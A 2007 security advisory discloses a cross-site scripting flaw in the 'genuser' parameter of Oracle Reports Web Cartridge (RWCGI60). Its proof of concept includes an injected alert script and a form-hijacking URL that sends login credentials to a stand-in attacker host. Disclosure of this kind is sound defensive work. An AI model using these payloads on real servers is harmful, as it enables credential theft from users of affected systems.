INTERNET SECURITY AUDITORS ALERT 2007-001
- Original release date: January 17, 2007
- Last revised: January 17, 2007
- Discovered by: Vicente Aguilera Diaz
- Severity: 3/5
=============================================

I. VULNERABILITY
-------------------------
Oracle Reports Web Cartridge (RWCGI60) vulnerable to XSS.

II. BACKGROUND
-------------------------
The Reports Web CGI or Web Cartridge is required for the Reports
Server when using the Oracle Application Server (OAS) to process
report requests from Web clients.

III. DESCRIPTION
-------------------------
Improper validation in "genuser" parameter allows to inject arbitrary
code script/HTML that will be executed in the client browser.

This is specially serious in authentication forms where a malicious
user can obtain the credentials of authentication of other users.

IV. PROOF OF CONCEPT
-------------------------
URL original:
http://<oracle-server>/dev60cgi/rwcgi60?showmap&server=<oracle-reports-server>

This request return a page with an authentication form (with User
Name, Password, and Database fields).

With a POST method (the rwcgi60 accept both methods: GET and POST),
the user send:
username=&password=&database=&authtype=D&genuser=&server=<oracle-reports-server>&nextpage=<next-page>

A malicious user can modify the value of the "genuser" parameter and
inject arbitrary script/HTML code:

-- Example 1 ---
http://<oracle-server>/dev60cgi/rwcgi60?showmap&server=<oracle-reports-server>&genuser=User
Name<script>alert('Vulnerable to XSS attack!');</script>


--- Example 2 ---
http://<oracle-server>/dev60cgi/rwcgi60?showmap&server=<oracle-reports-server>&genuser=</form><form
name='AttackerForm'

action='http://attacker-machine.com/credentials'>User Name

V. BUSINESS IMPACT
-------------------------
An attacker can spoof the session of other authenticated users,
obtains his authentication credentials, or deface the authentication
form page.

VI. SYSTEMS AFFECTED
-------------------------
Oracle9i Application Server Release 2, version 9.0.2.3
